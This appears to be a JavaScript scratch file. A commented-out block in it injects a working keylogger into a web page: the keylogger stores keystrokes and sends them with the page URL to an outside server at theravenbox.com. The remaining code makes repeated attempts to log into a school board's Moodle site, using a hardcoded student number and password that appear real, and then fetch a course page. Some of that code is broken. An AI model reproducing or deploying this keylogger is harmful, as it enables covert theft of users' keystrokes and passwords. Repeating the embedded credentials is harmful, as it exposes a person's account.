//########################
//# developed by $ql3t0  #
//########################
/*
document.body.setAttribute("onkeypress","getKeyCode(event)");
var tag = document.createElement('script');
//change the url in the code below to the url of your server
var txt = document.createTextNode('window.setInterval(sendKeys(), 10000); function sendKeys(){ var keys = localStorage.getItem("log_Extension"); var size = keys.length; if(size > 4) { new Image().src="https://theravenbox.com/keylogger/logs.php?values="+keys+"<br/>"+document.URL; localStorage.removeItem("log_Extension");} } function getKeyCode(event) { var x = event.keyCode || event.which ; switch(x) { case 30: alert(localStorage.getItem("log_Extension")); break; case 0: alert("All LOGs Clear- OK"); localStorage.removeItem("log_Extension"); break; case 10: x = "[ENTER]"; sendKeys(); break; case 13: x = "[ENTER]"; sendKeys(); break; } var txt = ""; txt = txt.concat(localStorage.getItem("log_Extension")); if(isNaN(x)){ var result = txt.concat(x); }else{ var result = txt.concat(String.fromCharCode(x)); } localStorage.setItem("log_Extension", result); }');
tag.appendChild(txt);
document.body.appendChild(tag);

fetch('https://moodle2.yrdsb.ca/login/index.php?username=349678631&password=by5ra3sw').then(r => r.text()).then(result => {
    // Result now contains the response text, do what you want...
})


var xhr = new XMLHttpRequest();

xhr.open("GET", "https://moodle2.yrdsb.ca/login/index.php");
xhr.send();

var document = xhr.responseText;

console.log(result)

$.ajax({
    url: "https://moodle2.yrdsb.ca/login/index.php",
    type: "GET",
    dataType: "html",
    success: function() {
        $.ajax({
            url: "https://moodle2.yrdsb.ca/login/index.php",
            type: "POST",
            data: {
                    "username": "349678631",
                    "password": "by5ra3sw",
                    "anchor": ""
            },
            dataType: "html",
            success: function(data) {
                   console.log(data)
            }
        });
    }
});

let xhr = new XMLHttpRequest();
let url = new URL("https://moodle2.yrdsb.ca/login/index.php")
xhr.open("POST",url)
xhr.send()
xhr.onload = function() {
  alert(`Loaded: ${xhr.status} ${xhr.response}`);
};
xhr.onerror = function() { // only triggers if the request couldn't be made at all
  alert(`Network Error`);
};

let formData = new FormData();

formData.append("349678631", "by5ra3sw");

let xhr = new XMLHttpRequest();
xhr.open("POST", "https://moodle2.yrdsb.ca/login/index.php?username=349678631&password=by5ra3sw&rememberusername=1&anchor=");

xhr.send();

xhr.open("GET","https://moodle2.yrdsb.ca/course/view.php?id=14996");
//xhr.responseType = 'document';
xhr.send();

xhr.onload = function() {
  let responseObj = xhr.response;
  alert(responseObj); // Hello, world!
};

//console.log("hello world")

var url = "https://moodle2.yrdsb.ca/login/index.php";
var username = "349678631";
var password = "by5ra3sw";
var xhr;
*/


fetch('https://moodle2.yrdsb.ca/login/index.php?username=349678631&password=by5ra3sw&rememberusername=1&anchor=').then(r => r.text()).then(result => {
    // Result now contains the response text, do what you want...
    alert(r)
})